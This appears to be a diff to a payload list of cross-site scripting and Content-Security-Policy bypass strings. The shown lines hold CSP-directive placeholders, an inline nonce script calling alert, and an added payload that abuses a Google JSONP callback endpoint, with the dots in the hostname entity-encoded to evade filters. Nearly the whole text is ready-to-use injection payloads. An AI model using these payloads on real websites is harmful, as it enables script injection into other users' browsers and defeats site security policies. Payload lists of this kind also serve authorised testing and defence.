@@ -163,3 +163,6 @@ ________________________________________________________________________________
 script-src-elem 'unsafe-inself' <payload>
 script-src-elem 'unsafe-eval' <payload>
 <script nonce="abc123">alert('CSP bypassed!');</script>
+
+--
+xss<script/src="https://www&#x2e;google&#x2e;com/complete/search?client=chrome&q=hello&callback=alert#1"> "></script>
